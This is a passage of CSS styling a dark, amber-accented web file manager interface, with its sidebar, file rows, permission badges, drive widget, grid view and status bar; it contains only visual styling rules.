    radial-gradient(ellipse 500px 380px at 50% 100%, rgba(255,215,110,.03) 0%, transparent 70%),
    radial-gradient(ellipse 600px 400px at 90% 0%, rgba(212,150,31,.05) 0%, transparent 70%),
    linear-gradient(170deg, rgba(5,6,8,0) 0%, var(--ink0) 50%, #030303 100%),
    var(--ink0);
}

/* ─── SHELL ───────────────────────────────────────────────────── */
.shell { position: relative; z-index: 1; display: flex; flex-direction: column; height: 100vh }

/* ─── TOPBAR ──────────────────────────────────────────────────── */
.topbar {
  height: var(--topbar-h);
  background: linear-gradient(180deg, rgba(10,11,14,.95), var(--ink1));
  border-bottom: 1px solid var(--bd2);
  display: flex; align-items: center;
  padding: 0 18px; gap: 14px;
  flex-shrink: 0; z-index: 80;
  box-shadow: 0 1px 0 rgba(245,185,66,.06), 0 1px 0 0 rgba(0,0,0,.4);
}

.logo {
  display: flex; align-items: center; gap: 11px;
  min-width: var(--sidebar-w); flex-shrink: 0;
  padding-right: 14px;
  border-right: 1px solid var(--bd2);
  margin-right: 4px;
  height: 100%;
}
.logo-icon {
  width: 32px; height: 32px; border-radius: 8px;
  background: var(--ink2);
  border: 1px solid var(--bd);
  display: grid; place-items: center; flex-shrink: 0;
  position: relative;
}
.logo-icon svg {
  width: 16px; height: 16px;
  stroke: var(--jade); fill: none;
}

.logo-text { display: flex; flex-direction: column; line-height: 1; gap: 5px }
.logo-name {
  font-size: 14px; font-weight: 600; letter-spacing: -.01em;
  color: var(--tx);
  display: flex; align-items: center; gap: 6px;
}
.logo-name em {
  font-style: normal; font-size: 9px; font-weight: 600;
  color: var(--jade); letter-spacing: .08em;
  padding: 1px 5px; border-radius: 3px;
  background: var(--jade-bg);
  border: 1px solid var(--jade-bd);
}
.logo-sub {
  font-size: 10px; font-weight: 500;
  color: var(--tx4); letter-spacing: .02em;
}
.logo-sub b {
  color: var(--tx3); font-weight: 500;
}

/* ─── SEARCH ──────────────────────────────────────────────────── */
.search-wrap { flex: 1; max-width: 460px; position: relative }
.search-wrap svg.search-ico {
  position: absolute; left: 13px; top: 50%;
  transform: translateY(-50%);
  width: 14px; height: 14px; fill: var(--tx3);
  transition: fill .15s var(--ease);
  pointer-events: none;
}
.search-wrap:focus-within svg.search-ico { fill: var(--jade) }
.search-wrap input {
  width: 100%; padding: 10px 70px 10px 38px;
  background: var(--ink2); border: 1px solid var(--bd2);
  border-radius: var(--r10); outline: none;
  font-size: 13px; color: var(--tx);
  transition: border-color .15s var(--ease), box-shadow .15s var(--ease), background .15s var(--ease);
}
.search-wrap input:hover:not(:focus) { background: var(--ink3); border-color: var(--bd) }
.search-wrap input:focus {
  background: var(--ink2);
  border-color: var(--jade-bd);
  box-shadow: var(--s-jade-soft);
}
.search-wrap input::placeholder { color: var(--tx3) }
.kbd-hint {
  position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
  display: flex; gap: 3px; pointer-events: none;
}
.kbd-hint kbd {
  padding: 2px 6px; font-size: 10px; font-family: var(--mono);
  color: var(--tx3); background: var(--ink3);
  border: 1px solid var(--bd2); border-radius: var(--r4);
  box-shadow: 0 1px 0 rgba(0,0,0,.3);
}

/* ─── TOPBAR RIGHT ────────────────────────────────────────────── */
.topbar-right { display: flex; align-items: center; gap: 8px; margin-left: auto }
.view-pills {
  display: flex; background: var(--ink2); border: 1px solid var(--bd2);
  border-radius: var(--r10); padding: 3px; gap: 2px;
  position: relative;
}
.view-pill {
  width: 30px; height: 26px; display: grid; place-items: center;
  border: none; background: transparent; border-radius: var(--r6);
  cursor: pointer; color: var(--tx3);
  transition: color .15s var(--ease), background .15s var(--ease);
}
.view-pill svg { width: 14px; height: 14px; fill: currentColor }
.view-pill:hover:not(.active) { background: var(--ink3); color: var(--tx2) }
.view-pill.active {
  background: linear-gradient(180deg, var(--ink4), var(--ink3));
  color: var(--jade);
  box-shadow: 0 1px 0 rgba(255,255,255,.04) inset, 0 1px 2px rgba(0,0,0,.3);
}

/* ─── BUTTONS ─────────────────────────────────────────────────── */
.btn {
  display: inline-flex; align-items: center; gap: 7px;
  padding: 8px 14px; font-size: 12.5px; font-weight: 500;
  border-radius: var(--r8); border: 1px solid var(--bd2);
  background: var(--ink3); color: var(--tx2);
  cursor: pointer; white-space: nowrap;
  transition:
    background-color .15s var(--ease),
    border-color .15s var(--ease),
    color .15s var(--ease),
    transform .12s var(--ease-out),
    box-shadow .15s var(--ease);
}
.btn svg { width: 14px; height: 14px; fill: currentColor; flex-shrink: 0 }
.btn:hover {
  background: var(--ink4); color: var(--tx);
  border-color: var(--jade-bd);
  transform: translateY(-1px);
  box-shadow: var(--s1);
}
.btn:active { transform: translateY(0); box-shadow: none; transition-duration: .05s }

.btn-primary {
  background: linear-gradient(180deg, var(--jade), var(--jade-lo));
  border-color: var(--jade-bd2);
  color: #ffffff;
  font-weight: 600;
  box-shadow:
    0 1px 0 rgba(255,255,255,.18) inset,
    0 1px 2px rgba(0,0,0,.3),
    0 0 0 1px rgba(245,185,66,.18);
  text-shadow: 0 1px 0 rgba(255,255,255,.1);
}
.btn-primary:hover {
  background: linear-gradient(180deg, var(--jade-hi), var(--jade));
  border-color: var(--jade);
  color: #ffffff;
  box-shadow:
    0 1px 0 rgba(255,255,255,.22) inset,
    0 4px 16px rgba(245,185,66,.32),
    0 0 0 1px rgba(245,185,66,.32);
}

.btn-danger {
  background: var(--red-bg);
  border-color: var(--red-bd);
  color: var(--red);
}
.btn-danger:hover {
  background: rgba(248,113,113,.18);
  border-color: rgba(248,113,113,.4);
  color: var(--red);
  box-shadow: 0 4px 16px rgba(248,113,113,.18);
}

.btn-term {
  background: var(--jade-bg);
  border-color: var(--jade-bd);
  color: var(--jade);
  font-weight: 600;
}
.btn-term:hover {
  background: rgba(245,185,66,.14);
  border-color: var(--jade-bd2);
  box-shadow: 0 4px 16px rgba(245,185,66,.18);
  color: var(--jade-hi);
}

.btn-icon { padding: 8px; gap: 0 }
.btn-ghost { background: transparent; border-color: transparent; color: var(--tx3) }
.btn-ghost:hover {
  background: var(--ink3); border-color: var(--bd2);
  color: var(--tx2); transform: none; box-shadow: none;
}
.btn-sm { padding: 6px 11px; font-size: 12px; border-radius: var(--r6) }

/* ─── LAYOUT ──────────────────────────────────────────────────── */
.body { display: flex; flex: 1; overflow: hidden; gap: 0 }

/* ─── SIDEBAR ─────────────────────────────────────────────────── */
.sidebar {
  width: var(--sidebar-w); flex-shrink: 0;
  background: linear-gradient(180deg, var(--ink1) 0%, var(--ink0) 100%);
  border-right: 1px solid var(--bd2);
  display: flex; flex-direction: column;
  overflow: hidden;
}
.sb-scroll {
  flex: 1; min-height: 0;
  overflow-y: auto; overflow-x: hidden;
  scrollbar-gutter: stable;
}
.sb-scroll::-webkit-scrollbar { width: 6px }
.sb-scroll::-webkit-scrollbar-track { background: transparent }
.sb-scroll::-webkit-scrollbar-thumb { background: var(--ink4); border-radius: 99px }
.sb-scroll::-webkit-scrollbar-thumb:hover { background: var(--ink5) }
.sb-foot {
  flex-shrink: 0;
  border-top: 1px solid var(--bd2);
  background: linear-gradient(180deg, transparent, rgba(0,0,0,.18));
}
.sidebar-top { padding: 14px 12px 4px }
.sidebar-label {
  font-size: 9px; font-weight: 800; text-transform: uppercase;
  letter-spacing: .18em; color: var(--tx4);
  padding: 0 11px; margin-bottom: 8px;
  display: flex; align-items: center; gap: 8px;
}
.sidebar-label svg {
  width: 11px; height: 11px;
  stroke: var(--jade); fill: none;
  opacity: .8; flex-shrink: 0;
}
.sidebar-label::after {
  content: ""; flex: 1; height: 1px;
  background: linear-gradient(90deg, var(--jade-bd), transparent);
}
.sb-btn {
  display: flex; align-items: center; gap: 11px;
  width: 100%; padding: 7px 11px 7px 9px;
  border: 1px solid transparent;
  background: transparent; border-radius: 8px;
  color: var(--tx2); cursor: pointer; text-align: left;
  font-size: 12.5px; font-weight: 500;
  margin-bottom: 1px;
  position: relative;
  transition:
    background-color .14s var(--ease),
    color .14s var(--ease),
    border-color .14s var(--ease),
    transform .18s var(--ease-out);
}
.sb-btn::before {
  content: ""; position: absolute;
  left: 0; top: 6px; bottom: 6px;
  width: 2px; background: var(--jade);
  border-radius: 0 2px 2px 0;
  transform: scaleX(0); transform-origin: left;
  transition: transform .2s var(--ease-out);
}
.sb-arrow {
  margin-left: auto; flex-shrink: 0;
  font-family: var(--mono); font-size: 13px;
  line-height: 1; color: var(--jade);
  opacity: 0;
  transform: translateX(-4px);
  transition: opacity .18s var(--ease), transform .18s var(--ease-out);
}
.sb-btn:hover {
  background: rgba(245,185,66,.05);
  color: var(--tx);
  border-color: rgba(245,185,66,.16);
  transform: translateX(2px);
}
.sb-btn:hover::before { transform: scaleX(1) }
.sb-btn:hover .sb-arrow { opacity: .9; transform: translateX(0) }
.sb-btn:active { transform: translateX(0); transition-duration: .05s }

.sb-btn.disabled,
.sb-btn[aria-disabled="true"] {
  opacity: .35;
  cursor: not-allowed;
  pointer-events: none;
}

.sb-ico {
  width: 28px; height: 28px; border-radius: 7px;
  display: grid; place-items: center; flex-shrink: 0;
  background: var(--ink3);
  border: 1px solid var(--bd2);
  position: relative; overflow: hidden;
  transition: background-color .14s var(--ease), border-color .14s var(--ease);
}
.sb-ico::after {
  content: ""; position: absolute; inset: 0;
  background: linear-gradient(135deg, rgba(245,185,66,.16) 0%, transparent 60%);
  opacity: 0;
  transition: opacity .14s var(--ease);
  pointer-events: none;
}
.sb-ico svg {
  width: 14px; height: 14px;
  stroke: var(--jade); fill: none;
  stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round;
  opacity: .9;
  transition: opacity .14s var(--ease);
  position: relative; z-index: 1;
}
.sb-btn:hover .sb-ico {
  background: var(--ink4);
  border-color: var(--jade-bd2);
}
.sb-btn:hover .sb-ico::after { opacity: 1 }
.sb-btn:hover .sb-ico svg { opacity: 1 }

/* Danger variant — for Delete Selected */
.sb-btn.danger:hover {
  background: rgba(248,113,113,.06);
  border-color: rgba(248,113,113,.22);
  color: #ffb3b3;
}
.sb-btn.danger::before { background: var(--red) }
.sb-btn.danger:hover .sb-ico {
  border-color: rgba(248,113,113,.36);
}
.sb-btn.danger:hover .sb-ico::after {
  background: linear-gradient(135deg, rgba(248,113,113,.18) 0%, transparent 60%);
}
.sb-btn.danger .sb-ico svg { stroke: var(--tx3) }
.sb-btn.danger:hover .sb-ico svg { stroke: var(--red) }
.sb-btn.danger:hover .sb-arrow { color: var(--red) }

.sidebar-divider {
  height: 1px;
  background: linear-gradient(90deg, transparent, var(--bd2) 30%, var(--bd2) 70%, transparent);
  margin: 10px 14px;
}

/* ─── DISK WIDGET ─────────────────────────────────────────────── */
.disk-box, .drive-box {
  margin: 10px 12px;
  padding: 14px;
  background: linear-gradient(180deg, var(--ink2), var(--ink1));
  border: 1px solid var(--bd2);
  border-radius: var(--r12);
  position: relative;
  overflow: hidden;
}
.disk-box::before, .drive-box::before {
  content: "";
  position: absolute; inset: 0; pointer-events: none;
  background: linear-gradient(180deg, rgba(245,185,66,.04) 0%, transparent 30%);
  border-radius: inherit;
}
.disk-label {
  font-size: 9.5px; font-weight: 700; color: var(--tx3);
  text-transform: uppercase; letter-spacing: .12em;
  margin-bottom: 12px;
  display: flex; align-items: center; gap: 6px;
}
.disk-label::before {
  content: ""; width: 5px; height: 5px; border-radius: 50%;
  background: var(--jade);
  box-shadow: 0 0 6px var(--jade);
}
.disk-track {
  height: 6px;
  background: var(--ink4);
  border-radius: 99px;
  overflow: hidden;
  margin-bottom: 10px;
  box-shadow: inset 0 1px 2px rgba(0,0,0,.4);
}
.disk-fill {
  height: 100%; border-radius: 99px;
  background: linear-gradient(90deg, var(--jade-dk) 0%, var(--jade-lo) 35%, var(--jade) 70%, var(--jade-hi) 100%);
  transition: width .6s var(--ease-out);
  box-shadow: 0 0 10px rgba(245,185,66,.5);
  position: relative;
}
.disk-meta {
  display: flex; justify-content: space-between;
  font-size: 11px; font-family: var(--mono);
  color: var(--tx2);
}
.disk-meta span:last-child { color: var(--jade); font-weight: 600 }

#driveSelect {
  width: 100%; padding: 9px 11px;
  background: var(--ink3); border: 1px solid var(--bd2);
  border-radius: var(--r8); color: var(--tx);
  font-family: var(--mono); font-size: 11.5px;
  cursor: pointer;
  transition: border-color .15s var(--ease), background-color .15s var(--ease);
}
#driveSelect:hover { background: var(--ink4); border-color: var(--bd) }
#driveSelect:focus { outline: none; border-color: var(--jade-bd); box-shadow: var(--s-jade-soft) }

.sidebar-sys {
  padding: 12px 14px;
  border-top: 1px solid var(--bd2);
  background: rgba(0,0,0,.2);
  font-size: 11px; color: var(--tx4); font-family: var(--mono); line-height: 1.85;
}
.sidebar-sys strong {
  color: var(--tx3); font-size: 9.5px;
  text-transform: uppercase; letter-spacing: .12em;
  font-family: var(--sans); font-weight: 700;
  display: block; margin-bottom: 4px;
}

/* ─── MAIN PANEL ──────────────────────────────────────────────── */
.main { flex: 1; display: flex; flex-direction: column; overflow: hidden; min-width: 0 }

/* ─── ACTION BAR ──────────────────────────────────────────────── */
.actionbar {
  padding: 10px 16px;
  background: linear-gradient(180deg, var(--ink1), var(--ink0));
  border-bottom: 1px solid var(--bd2);
  display: flex; align-items: center; gap: 10px; flex-shrink: 0;
}

/* ─── BREADCRUMB ──────────────────────────────────────────────── */
.breadcrumb {
  display: flex; align-items: center; gap: 1px;
  flex: 1; overflow-x: auto; scrollbar-width: none;
  padding: 5px 8px; min-height: 38px;
  background: var(--ink2);
  border: 1px solid var(--bd2);
  border-radius: var(--r10);
  flex-wrap: nowrap;
  position: relative;
}
.breadcrumb::-webkit-scrollbar { height: 0; display: none }
.breadcrumb::after {
  content: ""; position: absolute; right: 0; top: 0; bottom: 0; width: 24px;
  background: linear-gradient(90deg, transparent, var(--ink2));
  pointer-events: none; border-radius: 0 var(--r10) var(--r10) 0;
}
.bc-btn {
  padding: 4px 9px; border: 1px solid transparent;
  background: transparent; border-radius: var(--r6);
  font-size: 12px; font-weight: 500;
  color: var(--jade); cursor: pointer; white-space: nowrap;
  font-family: var(--mono);
  transition: background-color .12s var(--ease), color .12s var(--ease), border-color .12s var(--ease);
}
.bc-btn:hover {
  background: var(--jade-bg);
  color: var(--jade-hi);
  border-color: var(--jade-bd);
}
.bc-sep {
  color: var(--tx4); font-size: 11px;
  user-select: none; padding: 0 1px;
  font-family: var(--mono);
}
.bc-cur {
  color: var(--tx);
  cursor: default;
  font-weight: 600;
  background: var(--ink3);
  border-color: var(--bd2);
}
.bc-cur:hover { background: var(--ink3); color: var(--tx); border-color: var(--bd2) }

/* ─── FILE PANEL ──────────────────────────────────────────────── */
.panel {
  flex: 1; overflow-y: auto;
  background: var(--ink0);
  contain: layout style;
  transition: opacity .18s var(--ease);
}
.panel.drag-over {
  box-shadow: inset 0 0 0 2px var(--jade), inset 0 0 40px rgba(245,185,66,.08);
}

/* ─── TABLE HEADER ────────────────────────────────────────────── */
.tbl-head {
  display: grid;
  grid-template-columns: 36px 1fr 100px 86px 140px 110px;
  gap: 8px; padding: 10px 16px;
  background: linear-gradient(180deg, var(--ink1), var(--ink2));
  border-bottom: 1px solid var(--bd2);
  position: sticky; top: 0; z-index: 10;
  font-size: 10px; font-weight: 700; text-transform: uppercase;
  letter-spacing: .14em; color: var(--tx3);
  box-shadow: 0 1px 0 rgba(0,0,0,.3), inset 0 -1px 0 rgba(245,185,66,.04);
  align-items: center;
}
.tbl-head .th-sort {
  display: flex; align-items: center; gap: 4px;
  cursor: pointer;
  padding: 3px 6px; margin: -3px -6px;
  border-radius: 4px;
  transition: color .12s var(--ease), background-color .12s var(--ease);
  user-select: none;
}
.tbl-head .th-sort:hover { color: var(--tx); background: var(--ink3) }
.tbl-head .th-sort.active { color: var(--jade) }
.tbl-head .th-arrow {
  width: 10px; height: 10px; opacity: 0;
  transition: opacity .12s var(--ease), transform .15s var(--ease);
  fill: currentColor;
}
.tbl-head .th-sort.active .th-arrow { opacity: 1 }
.tbl-head .th-sort.active.desc .th-arrow { transform: rotate(180deg) }

.tbl-head .chk-cell { cursor: pointer }

/* ─── FILE ROWS ───────────────────────────────────────────────── */
.flist { list-style: none; padding: 4px 0 12px }

.frow {
  display: grid;
  grid-template-columns: 36px 1fr 100px 86px 140px 110px;
  gap: 8px; padding: 0 16px;
  align-items: center; min-height: 48px;
  border-bottom: 1px solid var(--bd3);
  user-select: none;
  position: relative;
  transition:
    background-color .14s var(--ease),
    border-color .14s var(--ease);
  overflow: hidden;
}
.frow:last-child { border-bottom: none }
.frow::before {
  content: ""; position: absolute; left: 0; top: 0; bottom: 0;
  width: 3px;
  background: linear-gradient(180deg, var(--jade-hi), var(--jade), var(--jade-lo));
  transform: scaleY(0); transform-origin: center;
  transition: transform .18s var(--ease-out);
  border-radius: 0 2px 2px 0;
}
.frow::after {
  content: ""; position: absolute; inset: 0; pointer-events: none;
  background: linear-gradient(90deg, var(--jade-bg) 0%, transparent 60%);
  opacity: 0;
  transition: opacity .18s var(--ease);
}
.frow:hover { background: rgba(245,185,66,.025) }
.frow:hover::before { transform: scaleY(.7) }
.frow:hover::after { opacity: 1 }
.frow.sel {
  background: linear-gradient(90deg, var(--jade-bg), rgba(245,185,66,.04));
  border-bottom-color: rgba(245,185,66,.08);
}
.frow.sel::before {
  transform: scaleY(1);
  box-shadow: 0 0 12px var(--jade), 0 0 4px var(--jade);
}
.frow.sel:hover::after { opacity: 0 }
.frow > * { position: relative; z-index: 1 }

/* ─── CHECKBOX ────────────────────────────────────────────────── */
.chk-cell { display: flex; align-items: center; justify-content: center }
.chk-box {
  width: 16px; height: 16px; border-radius: var(--r4); cursor: pointer;
  background: var(--ink3); border: 1.5px solid var(--ink6);
  display: grid; place-items: center;
  transition: border-color .12s var(--ease), background-color .12s var(--ease);
  flex-shrink: 0;
}
.chk-box:hover { border-color: var(--jade) }
.chk-box.on {
  background: var(--jade);
  border-color: var(--jade);
  box-shadow: 0 0 0 1px var(--jade-bd2), 0 1px 4px rgba(245,185,66,.4);
}
.chk-box.on::after {
  content: ""; width: 4px; height: 7px;
  border: 1.5px solid #ffffff; border-width: 0 1.6px 1.6px 0;
  transform: rotate(45deg) translate(-1px,-1px);
}

/* ─── FILE NAME CELL ──────────────────────────────────────────── */
.fname-cell { display: flex; align-items: center; gap: 11px; min-width: 0; cursor: pointer }
.fname-text {
  flex: 1; min-width: 0;
  display: flex; align-items: center; gap: 7px;
}
.fname-text > .fname {
  font-size: 13px; font-weight: 500;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  transition: color .12s var(--ease);
  color: var(--tx);
}
.fname-cell:hover .fname { color: var(--jade-hi) }
.fname-chip {
  display: inline-block; flex-shrink: 0;
  padding: 1px 6px; border-radius: 3px;
  font-family: var(--mono); font-size: 9px; font-weight: 700;
  text-transform: uppercase; letter-spacing: .06em;
  background: color-mix(in srgb, var(--type-color, var(--jade)) 12%, transparent);
  color: var(--type-color, var(--jade));
  border: 1px solid color-mix(in srgb, var(--type-color, var(--jade)) 22%, transparent);
  opacity: .85;
}
@supports not (background: color-mix(in srgb, red, blue)) {
  .fname-chip {
    background: var(--ink3);
    color: var(--type-color, var(--jade));
    border: 1px solid var(--bd2);
  }
}
.frow:hover .fname-chip { opacity: 1 }

/* ─── ICON ────────────────────────────────────────────────────── */
.ico-wrap {
  width: 30px; height: 30px; border-radius: var(--r8); flex-shrink: 0;
  display: grid; place-items: center;
  background: var(--ink2);
  border: 1px solid var(--bd2);
  transition: background-color .12s var(--ease), border-color .12s var(--ease), transform .15s var(--ease-out);
  position: relative;
}
.frow:hover .ico-wrap, .gcard:hover .ico-wrap {
  background: var(--ink3);
  border-color: var(--type-bd, var(--jade-bd));
}
.fico {
  width: 16px; height: 16px;
  fill: var(--type-color, var(--jade));
  color: var(--type-color, var(--jade));
  opacity: .95;
  transition: opacity .12s var(--ease);
  shape-rendering: geometricPrecision;
}
.frow:hover .fico, .gcard:hover .fico { opacity: 1 }

/* ─── FILE TYPE COLORS — per data-icon ───────────────────────── */
[data-icon="folder"] { --type-color: #f5b942; --type-bd: rgba(245,185,66,.32) }
[data-icon="php"]    { --type-color: #a78bfa; --type-bd: rgba(167,139,250,.32) }
[data-icon="js"]     { --type-color: #f1e05a; --type-bd: rgba(241,224,90,.32) }
[data-icon="css"]    { --type-color: #ff7b72; --type-bd: rgba(255,123,114,.32) }
[data-icon="html"]   { --type-color: #ff9f6e; --type-bd: rgba(255,159,110,.32) }
[data-icon="config"] { --type-color: #a5d6ff; --type-bd: rgba(165,214,255,.32) }
[data-icon="text"]   { --type-color: #c9d1d9; --type-bd: rgba(201,209,217,.28) }
[data-icon="image"]  { --type-color: #7ee787; --type-bd: rgba(126,231,135,.32) }
[data-icon="archive"]{ --type-color: #ffa657; --type-bd: rgba(255,166,87,.32) }
[data-icon="database"]{--type-color: #d2a8ff; --type-bd: rgba(210,168,255,.32) }
[data-icon="file"]   { --type-color: #8b949e; --type-bd: rgba(139,148,158,.28) }

/* Selected state: tint ico-wrap with type color */
.frow.sel .ico-wrap, .gcard.sel .ico-wrap {
  background: color-mix(in srgb, var(--type-color, var(--jade)) 14%, var(--ink2));
  border-color: var(--type-bd, var(--jade-bd2));
}
@supports not (background: color-mix(in srgb, red, blue)) {
  .frow.sel .ico-wrap, .gcard.sel .ico-wrap {
    background: var(--ink3);
    border-color: var(--type-bd, var(--jade-bd2));
  }
}

/* ─── STAGGER FADE-IN ANIMATION ──────────────────────────────── */
@keyframes rowIn {
  from { opacity: 0; transform: translateY(-4px) }
  to   { opacity: 1; transform: translateY(0) }
}
@keyframes cardIn {
  from { opacity: 0; transform: translateY(8px) scale(.97) }
  to   { opacity: 1; transform: translateY(0) scale(1) }
}
.flist .frow {
  animation: rowIn .28s var(--ease-out) backwards;
  animation-delay: clamp(0ms, calc(var(--i, 0) * 16ms), 500ms);
}
.grid-wrap .gcard {
  animation: cardIn .32s var(--ease-out) backwards;
  animation-delay: clamp(0ms, calc(var(--i, 0) * 22ms), 600ms);
}

/* ─── META CELLS ──────────────────────────────────────────────── */
.fmeta {
  font-size: 11.5px;
  color: var(--tx3);
  font-family: var(--mono);
  font-variant-numeric: tabular-nums;
}
.perm {
  display: inline-block;
  padding: 2.5px 9px;
  font-size: 10.5px; font-family: var(--mono); font-weight: 600;
  background: var(--ink3);
  border: 1px solid var(--bd2);
  border-radius: var(--r4);
  color: var(--tx2);
  cursor: pointer;
  letter-spacing: .04em;
  position: relative;
  transition: border-color .12s var(--ease), color .12s var(--ease), background-color .12s var(--ease), transform .12s var(--ease);
}
.perm:hover { transform: translateY(-1px) }

/* WRITABLE — owner has write bit → GREEN */
.perm.perm-ok {
  color: #7ee787;
  border-color: rgba(126,231,135,.30);
  background: rgba(126,231,135,.07);
}
.perm.perm-ok:hover {
  background: rgba(126,231,135,.16);
  border-color: rgba(126,231,135,.55);
  box-shadow: 0 2px 8px rgba(126,231,135,.16);
}

/* WRITABLE + EXECUTABLE — also exec bit (e.g. 755) → BRIGHTER GREEN */
.perm.perm-ok-x {
  color: #4ade80;
  border-color: rgba(74,222,128,.36);
  background: rgba(74,222,128,.08);
}
.perm.perm-ok-x:hover {
  background: rgba(74,222,128,.18);
  border-color: rgba(74,222,128,.6);
  box-shadow: 0 2px 8px rgba(74,222,128,.2);
}

/* READ-ONLY — no owner write → RED (locked) */
.perm.perm-locked {
  color: #ff8e8e;
  border-color: rgba(248,113,113,.32);
  background: rgba(248,113,113,.07);
}
.perm.perm-locked:hover {
  background: rgba(248,113,113,.16);
  border-color: rgba(248,113,113,.55);
  box-shadow: 0 2px 8px rgba(248,113,113,.18);
}


/* ─── ROW ACTIONS ─────────────────────────────────────────────── */
.row-acts {
  display: flex; gap: 2px; opacity: 0;
  transform: translateX(6px);
  transition: opacity .18s var(--ease), transform .18s var(--ease);
  justify-content: flex-end;
}
.frow:hover .row-acts, .frow.sel .row-acts { opacity: 1; transform: translateX(0) }
.ico-btn {
  width: 28px; height: 28px; display: grid; place-items: center;
  border: 1px solid transparent; background: transparent; border-radius: var(--r6);
  cursor: pointer; color: var(--tx3);
  transition: background-color .12s var(--ease), color .12s var(--ease), border-color .12s var(--ease);
}
.ico-btn svg { width: 13px; height: 13px; fill: currentColor }
.ico-btn:hover {
  background: var(--ink4); color: var(--jade);
  border-color: var(--bd2);
}
.ico-btn.del:hover {
  color: var(--red); background: var(--red-bg);
  border-color: rgba(248,113,113,.25);
}

/* ─── BULK SELECTION FLOATING BAR ─────────────────────────────── */
.bulk-bar {
  position: fixed; left: 50%; bottom: calc(var(--statusbar-h) + 16px);
  transform: translateX(-50%) translateY(calc(100% + 24px));
  z-index: 150;
  display: flex; align-items: center; gap: 4px;
  padding: 6px 6px 6px 14px;
  background: linear-gradient(180deg, var(--ink3), var(--ink2));
  border: 1px solid var(--jade-bd);
  border-radius: 12px;
  box-shadow:
    0 12px 40px rgba(0,0,0,.55),
    0 0 0 1px rgba(245,185,66,.18),
    0 0 24px rgba(245,185,66,.1),
    inset 0 1px 0 rgba(255,255,255,.04);
  font-size: 12px;
  opacity: 0; pointer-events: none;
  transition:
    transform .26s var(--spring),
    opacity .2s var(--ease);
}
.bulk-bar.show {
  opacity: 1;
  transform: translateX(-50%) translateY(0);
  pointer-events: auto;
}
.bulk-count {
  font-family: var(--mono); font-weight: 700;
  color: var(--jade); margin-right: 2px;
  font-variant-numeric: tabular-nums;
}
.bulk-label { color: var(--tx2); font-weight: 500 }
.bulk-sep {
  width: 1px; height: 18px;
  background: var(--bd2);
  margin: 0 6px;
}
.bulk-bar .bulk-btn {
  display: inline-flex; align-items: center; gap: 6px;
  padding: 6px 11px; border-radius: 7px;
  font-size: 12px; font-weight: 500;
  background: transparent; border: 1px solid transparent;
  color: var(--tx2); cursor: pointer;
  transition: all .14s var(--ease);
}
.bulk-bar .bulk-btn svg { width: 13px; height: 13px; fill: currentColor }
.bulk-bar .bulk-btn:hover {
  background: var(--ink4); color: var(--jade);
  border-color: var(--bd2);
}
.bulk-bar .bulk-btn.del:hover {
  color: var(--red); background: var(--red-bg);
  border-color: rgba(248,113,113,.3);
}
.bulk-bar .bulk-btn.close {
  width: 28px; padding: 0; height: 28px; justify-content: center;
}
@media (max-width: 640px) {
  .bulk-bar { left: 8px; right: 8px; transform: translateX(0) translateY(calc(100% + 24px)); width: auto }
  .bulk-bar.show { transform: translateX(0) translateY(0) }
  .bulk-bar .bulk-btn span:not(.bulk-only) { display: none }
}

/* ─── GRID VIEW ───────────────────────────────────────────────── */
.grid-wrap {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(135px, 1fr));
  gap: 12px; padding: 16px;
}
.gcard {
  background: linear-gradient(180deg, var(--ink2), var(--ink1));
  border: 1px solid var(--bd2);
  border-radius: var(--r14);
  padding: 22px 12px 14px;
  text-align: center; cursor: pointer;
  position: relative; overflow: hidden;
  transition:
    transform .2s var(--spring),
    border-color .15s var(--ease),
    box-shadow .15s var(--ease),
    background-color .15s var(--ease);
}
.gcard::before {
  content: ""; position: absolute; inset: 0; pointer-events: none;
  background: linear-gradient(180deg, rgba(255,255,255,.025) 0%, transparent 40%);
  border-radius: inherit;
}
.gcard:hover {
  transform: translateY(-3px);
  border-color: var(--jade-bd2);
  box-shadow: var(--s2), 0 0 0 1px var(--jade-bd);
}
.gcard.sel {
  border-color: var(--jade);
  background: linear-gradient(180deg, var(--jade-bg), rgba(245,185,66,.02));
  box-shadow: 0 0 0 1px var(--jade-bd2), var(--s2);
}
.gcard .ico-wrap {
  width: 52px; height: 52px;
  margin: 0 auto 12px;
  border-radius: var(--r12);
  background: linear-gradient(160deg, var(--ink3), var(--ink2));
}
.gcard .fico { width: 26px; height: 26px }
.gcard:hover .ico-wrap {
  border-color: var(--jade-bd2);
  background: linear-gradient(160deg, var(--ink4), var(--ink3));
}
.gname {
  font-size: 12.5px; font-weight: 500;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  color: var(--tx); position: relative;
}
.gsize {
  font-size: 10.5px; color: var(--tx3);
  margin-top: 4px; font-family: var(--mono);
  font-variant-numeric: tabular-nums; position: relative;
  display: flex; align-items: center; justify-content: center; gap: 6px;
}
.gext {
  font-size: 8.5px; font-weight: 700;
  padding: 1px 5px; border-radius: 3px;
  letter-spacing: .06em;
  background: color-mix(in srgb, var(--type-color, var(--jade)) 14%, transparent);
  color: var(--type-color, var(--jade));
  border: 1px solid color-mix(in srgb, var(--type-color, var(--jade)) 24%, transparent);
}
@supports not (background: color-mix(in srgb, red, blue)) {
  .gext { background: var(--ink3); border: 1px solid var(--bd2) }
}

/* ─── STATUS BAR ──────────────────────────────────────────────── */
.statusbar {
  height: var(--statusbar-h);
  background: linear-gradient(180deg, var(--ink1), var(--ink0));
  border-top: 1px solid var(--bd2);
  display: flex; align-items: center; padding: 0 16px; gap: 18px;
  font-size: 11px; font-family: var(--mono); color: var(--tx3);
  flex-shrink: 0;
  font-variant-numeric: tabular-nums;
}
.pulse-dot {
  width: 7px; height: 7px; border-radius: 50%;
  background: var(--jade);
  box-shadow: 0 0 0 0 rgba(245,185,66,.6);
  animation: pulseDot 2.4s var(--ease) infinite;
  flex-shrink: 0;
}
@keyframes pulseDot {
  0%, 100% { box-shadow: 0 0 0 0 rgba(245,185,66,.5); opacity: 1 }
  50%      { box-shadow: 0 0 0 5px rgba(245,185,66,0); opacity: .6 }
}
.statusbar strong { color: var(--tx2); font-weight: 600 }
.st-right { margin-left: auto }
.statusbar > span { display: inline-flex; align-items: center; gap: 6px }

/* ─── EMPTY STATE ─────────────────────────────────────────────── */
.empty { padding: 90px 24px; text-align: center; color: var(--tx3); position: relative; z-index: 1 }
.empty-ico {
  width: 84px; height: 84px;
  margin: 0 auto 22px;
  border-radius: 18px;
  background:
